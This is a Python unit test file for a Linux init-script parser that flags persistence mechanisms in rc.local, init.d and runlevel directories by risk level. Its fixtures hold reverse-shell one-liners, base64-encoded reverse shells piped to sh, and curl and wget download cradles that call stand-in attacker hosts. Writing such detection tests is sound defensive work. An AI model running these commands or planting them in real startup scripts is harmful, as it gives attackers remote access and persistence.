# Copyright 2024 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Unit tests for Linux Init & Startup Scripts parser."""

from __future__ import annotations

import os
from pathlib import Path

from src.utils.linux_init import (
    LinuxInitParser,
    analyze_init,
    extract_active_rc_commands,
    extract_base64_payload,
)
from src.utils.models import AnalysisTarget, RiskLevel


def test_extract_active_rc_commands():
    """Test extracting active commands from rc.local while ignoring comments and exit 0."""
    content = """#!/bin/sh -e
#
# rc.local
# This script does nothing by default.
#

/usr/local/bin/app --daemon
   # indented comment

/opt/custom/init.sh &
exit 0
"""
    cmds = extract_active_rc_commands(content)
    assert cmds == [
        "/usr/local/bin/app --daemon",
        "/opt/custom/init.sh &",
    ]


def test_extract_active_rc_commands_empty():
    """Test extracting active commands when rc.local contains only comments and exit."""
    content = """#!/bin/sh
# comments only
exit 0;
"""
    cmds = extract_active_rc_commands(content)
    assert cmds == []


def test_extract_base64_payload():
    """Test detecting and decoding base64 payloads in init commands."""
    cmd = "echo 'c2ggLWkgPiYgL2Rldi90Y3AvMS4yLjMuNC85OTk5IDA+JjE=' | base64 -d | sh"
    has_b64, dec = extract_base64_payload(cmd)
    assert has_b64 is True
    assert dec == "sh -i >& /dev/tcp/1.2.3.4/9999 0>&1"

    # Non-base64 command
    has_b64, dec = extract_base64_payload("/usr/bin/python3 /tmp/test.py")
    assert has_b64 is False
    assert dec is None

    # Base64 with <<< syntax
    cmd2 = "base64 -d <<<'ZXhhbXBsZQ==' | bash"
    has_b64_2, dec2 = extract_base64_payload(cmd2)
    assert has_b64_2 is True
    assert dec2 == "example"


def test_rc_local_empty_no_findings(tmp_path: Path):
    """Test empty default rc.local produces no persistence findings."""
    rc_file = tmp_path / "etc" / "rc.local"
    rc_file.parent.mkdir(parents=True)
    rc_file.write_text("#!/bin/sh -e\n# default\nexit 0\n")

    target = AnalysisTarget(root_path=str(tmp_path))
    findings = analyze_init(target)
    assert len(findings) == 0


def test_rc_local_active_benign_commands(tmp_path: Path):
    """Test active commands in rc.local produce medium severity finding."""
    rc_file = tmp_path / "etc" / "rc.local"
    rc_file.parent.mkdir(parents=True)
    rc_file.write_text("#!/bin/sh -e\n/usr/local/bin/startup_probe.sh\nexit 0\n")

    target = AnalysisTarget(root_path=str(tmp_path))
    findings = analyze_init(target)
    assert len(findings) == 1

    f = findings[0]
    assert f.category == "rc_local_script"
    assert f.risk_level == RiskLevel.MEDIUM
    assert f.technique_id == "T1037.004"
    assert f.path == "/etc/rc.local"
    assert "RC_LOCAL_ACTIVE_COMMANDS" in f.details["flags"]
    assert f.details["active_commands"] == ["/usr/local/bin/startup_probe.sh"]


def test_rc_local_reverse_shell(tmp_path: Path):
    """Test reverse shell command in rc.local flags as critical risk."""
    rc_file = tmp_path / "etc" / "rc.local"
    rc_file.parent.mkdir(parents=True)
    rc_file.write_text("#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\nexit 0\n")

    target = AnalysisTarget(root_path=str(tmp_path))
    findings = analyze_init(target)
    assert len(findings) == 1

    f = findings[0]
    assert f.category == "rc_local_script"
    assert f.risk_level == RiskLevel.CRITICAL
    assert "RC_LOCAL_ACTIVE_COMMANDS" in f.details["flags"]
    assert "REVERSE_SHELL_PATTERN" in f.details["flags"]
    assert f.path == "/etc/rc.local"


def test_rc_local_user_home_execution(tmp_path: Path):
    """Test rc.local executing commands from user home directories flags as critical."""
    rc_file = tmp_path / "etc" / "rc.local"
    rc_file.parent.mkdir(parents=True)
    rc_file.write_text("#!/bin/sh\n/home/alice/agent_startup.sh &\nexit 0\n")

    target = AnalysisTarget(root_path=str(tmp_path))
    findings = analyze_init(target)
    assert len(findings) == 1

    f = findings[0]
    assert f.risk_level == RiskLevel.CRITICAL
    assert "SYSTEM_INIT_POINTS_TO_USER_HOME" in f.details["flags"]


def test_rc_local_tmp_and_hidden_path(tmp_path: Path):
    """Test rc.local executing binaries in temporary and hidden paths flags as high."""
    rc_file = tmp_path / "etc" / "rc.local"
    rc_file.parent.mkdir(parents=True)
    rc_file.write_text("#!/bin/sh\n/dev/shm/.stealth/run.sh\nexit 0\n")

    target = AnalysisTarget(root_path=str(tmp_path))
    findings = analyze_init(target)
    assert len(findings) == 1

    f = findings[0]
    assert f.risk_level == RiskLevel.HIGH
    assert "EXEC_FROM_TMP_OR_DEV_SHM" in f.details["flags"]
    assert "HIDDEN_PATH_EXECUTION" in f.details["flags"]


def test_rc_local_base64_payload_with_nested_reverse_shell(tmp_path: Path):
    """Test rc.local with base64 encoded reverse shell payload decodes and flags critical."""
    rc_file = tmp_path / "etc" / "rc.local"
    rc_file.parent.mkdir(parents=True)
    # Payload decodes to: "sh -i >& /dev/tcp/10.10.10.10/4444 0>&1"
    rc_file.write_text(
        "#!/bin/sh\n"
        "echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvNDQ0NCAwPiYx' | base64 -d | sh\n"
        "exit 0\n"
    )

    target = AnalysisTarget(root_path=str(tmp_path))
    findings = analyze_init(target)
    assert len(findings) == 1

    f = findings[0]
    assert f.risk_level == RiskLevel.CRITICAL
    assert "BASE64_PAYLOAD" in f.details["flags"]
    assert "REVERSE_SHELL_PATTERN" in f.details["flags"]
    assert f.decoded_payload == "sh -i >& /dev/tcp/10.10.10.10/4444 0>&1"


def test_rc_local_download_cradle(tmp_path: Path):
    """Test curl pipe to shell download cradle in rc.local flags as high risk."""
    rc_file = tmp_path / "etc" / "rc.d" / "rc.local"
    rc_file.parent.mkdir(parents=True)
    rc_file.write_text(
        "#!/bin/sh\ncurl -s https://evil.example.com/bootstrap.sh | bash\nexit 0\n"
    )

    target = AnalysisTarget(root_path=str(tmp_path))
    findings = analyze_init(target)
    assert len(findings) == 1

    f = findings[0]
    assert f.risk_level == RiskLevel.HIGH
    assert "DOWNLOAD_CRADLE" in f.details["flags"]
    assert f.path == "/etc/rc.d/rc.local"


def test_rc_local_symlink_deduplication(tmp_path: Path):
    """Test symlinked rc.local files are deduplicated."""
    etc_dir = tmp_path / "etc"
    etc_rc_dir = tmp_path / "etc" / "rc.d"
    etc_rc_dir.mkdir(parents=True)

    real_rc = etc_rc_dir / "rc.local"
    real_rc.write_text("#!/bin/sh\n/usr/bin/custom_init\nexit 0\n")

    # Symlink /etc/rc.local -> rc.d/rc.local
    link_rc = etc_dir / "rc.local"
    os.symlink("rc.d/rc.local", str(link_rc))

    target = AnalysisTarget(root_path=str(tmp_path))
    findings = analyze_init(target)
    # Should only produce 1 finding, not duplicated across both paths
    assert len(findings) == 1


def test_init_d_benign_script_no_findings(tmp_path: Path):
    """Test benign init.d service scripts produce no persistence findings."""
    init_dir = tmp_path / "etc" / "init.d"
    init_dir.mkdir(parents=True)
    script = init_dir / "networking"
    script.write_text(
        "#!/bin/sh\n"
        "# Standard network init\n"
        'case "$1" in\n'
        "  start)\n"
        "    /sbin/ifup -a\n"
        "    ;;\n"
        "esac\n"
    )

    target = AnalysisTarget(root_path=str(tmp_path))
    findings = analyze_init(target)
    assert len(findings) == 0


def test_init_d_user_home_execution(tmp_path: Path):
    """Test init.d script pointing to user home directories flags as critical."""
    init_dir = tmp_path / "etc" / "init.d"
    init_dir.mkdir(parents=True)
    script = init_dir / "malicious_service"
    script.write_text("#!/bin/sh\n# Evil init\n/home/developer/bot/run.sh --start\n")

    target = AnalysisTarget(root_path=str(tmp_path))
    findings = analyze_init(target)
    assert len(findings) == 1

    f = findings[0]
    assert f.category == "sysv_init_script"
    assert f.risk_level == RiskLevel.CRITICAL
    assert f.technique_id == "T1037.004"
    assert f.path == "/etc/init.d/malicious_service"
    assert "SYSTEM_INIT_POINTS_TO_USER_HOME" in f.details["flags"]
    assert "SUSPICIOUS_INIT_SCRIPT" in f.details["flags"]


def test_init_d_tmp_execution(tmp_path: Path):
    """Test init.d script executing from /tmp directory flags as high risk."""
    init_dir = tmp_path / "etc" / "init.d"
    init_dir.mkdir(parents=True)
    script = init_dir / "temp_daemon"
    script.write_text("#!/bin/sh\n/tmp/miner_daemon -c /tmp/config.json\n")

    target = AnalysisTarget(root_path=str(tmp_path))
    findings = analyze_init(target)
    assert len(findings) == 1

    f = findings[0]
    assert f.risk_level == RiskLevel.HIGH
    assert "EXEC_FROM_TMP_OR_DEV_SHM" in f.details["flags"]
    assert "SUSPICIOUS_INIT_SCRIPT" in f.details["flags"]


def test_init_d_reverse_shell_and_wget_pipe(tmp_path: Path):
    """Test init.d script with reverse shell and wget pipe flags as critical."""
    init_dir = tmp_path / "etc" / "init.d"
    init_dir.mkdir(parents=True)
    script = init_dir / "backdoor_init"
    script.write_text(
        "#!/bin/sh\n"
        "wget -O - http://c2.evil/stage1.sh | sh\n"
        "nc -e /bin/bash 192.168.1.100 4444\n"
    )

    target = AnalysisTarget(root_path=str(tmp_path))
    findings = analyze_init(target)
    assert len(findings) == 1

    f = findings[0]
    assert f.risk_level == RiskLevel.CRITICAL
    assert "DOWNLOAD_CRADLE" in f.details["flags"]
    assert "REVERSE_SHELL_PATTERN" in f.details["flags"]
    assert "SUSPICIOUS_INIT_SCRIPT" in f.details["flags"]


def test_rc2_d_symlink_to_user_home(tmp_path: Path):
    """Test runlevel symlink targeting user home directory flags as critical."""
    (tmp_path / "etc" / "rc2.d").mkdir(parents=True)
    (tmp_path / "home" / "user").mkdir(parents=True)
    target_script = tmp_path / "home" / "user" / "evil.sh"
    target_script.write_text("#!/bin/sh\n/home/user/evil.sh\n")

    # Symlink /etc/rc2.d/S99backdoor -> ../../home/user/evil.sh
    link_path = tmp_path / "etc" / "rc2.d" / "S99backdoor"
    os.symlink("../../home/user/evil.sh", str(link_path))

    target = AnalysisTarget(root_path=str(tmp_path))
    findings = analyze_init(target)
    assert len(findings) == 1

    f = findings[0]
    assert f.category == "sysv_init_script"
    assert f.risk_level == RiskLevel.CRITICAL
    assert f.technique_id == "T1037.004"
    assert f.path == "/etc/rc2.d/S99backdoor"
    assert "SYSTEM_INIT_POINTS_TO_USER_HOME" in f.details["flags"]
    assert f.details["symlink_target"] == "/home/user/evil.sh"
    assert f.details["runlevel"] == "rc2.d"


def test_rc3_d_symlink_to_tmp(tmp_path: Path):
    """Test runlevel symlink targeting temporary directory flags as high risk."""
    (tmp_path / "etc" / "rc3.d").mkdir(parents=True)
    (tmp_path / "tmp").mkdir(parents=True)
    target_script = tmp_path / "tmp" / "persist.sh"
    target_script.write_text("#!/bin/sh\necho persist\n")

    link_path = tmp_path / "etc" / "rc3.d" / "S99tmp"
    os.symlink("../../tmp/persist.sh", str(link_path))

    target = AnalysisTarget(root_path=str(tmp_path))
    findings = analyze_init(target)
    assert len(findings) == 1

    f = findings[0]
    assert f.category == "sysv_init_script"
    assert f.risk_level == RiskLevel.HIGH
    assert f.path == "/etc/rc3.d/S99tmp"
    assert "EXEC_FROM_TMP_OR_DEV_SHM" in f.details["flags"]
    assert f.details["symlink_target"] == "/tmp/persist.sh"
    assert f.details["runlevel"] == "rc3.d"


def test_rc_symlink_normal_init_d_not_flagged(tmp_path: Path):
    """Test normal runlevel symlink pointing to benign init.d script is not flagged."""
    (tmp_path / "etc" / "rc2.d").mkdir(parents=True)
    (tmp_path / "etc" / "init.d").mkdir(parents=True)
    init_script = tmp_path / "etc" / "init.d" / "cron"
    init_script.write_text("#!/bin/sh\n# Normal cron service\n")

    link_path = tmp_path / "etc" / "rc2.d" / "S01cron"
    os.symlink("../init.d/cron", str(link_path))

    target = AnalysisTarget(root_path=str(tmp_path))
    findings = analyze_init(target)
    # Normal symlink to /etc/init.d/cron without suspicious contents should produce 0 findings
    assert len(findings) == 0


def test_rc5_d_regular_script_direct(tmp_path: Path):
    """Test direct script in runlevel directory executing user script flags as critical."""
    (tmp_path / "etc" / "rc5.d").mkdir(parents=True)
    script_path = tmp_path / "etc" / "rc5.d" / "S99direct"
    script_path.write_text("#!/bin/sh\n/home/admin/start_monitor.sh\n")

    target = AnalysisTarget(root_path=str(tmp_path))
    findings = analyze_init(target)
    assert len(findings) == 1

    f = findings[0]
    assert f.category == "sysv_init_script"
    assert f.risk_level == RiskLevel.CRITICAL
    assert f.path == "/etc/rc5.d/S99direct"
    assert "SYSTEM_INIT_POINTS_TO_USER_HOME" in f.details["flags"]
    assert "SUSPICIOUS_INIT_SCRIPT" in f.details["flags"]
    assert f.details["runlevel"] == "rc5.d"


def test_parser_class_instance(tmp_path: Path):
    """Test LinuxInitParser class parse method on empty target."""
    parser = LinuxInitParser()
    target = AnalysisTarget(root_path=str(tmp_path))
    findings = parser.parse(target)
    assert findings == []
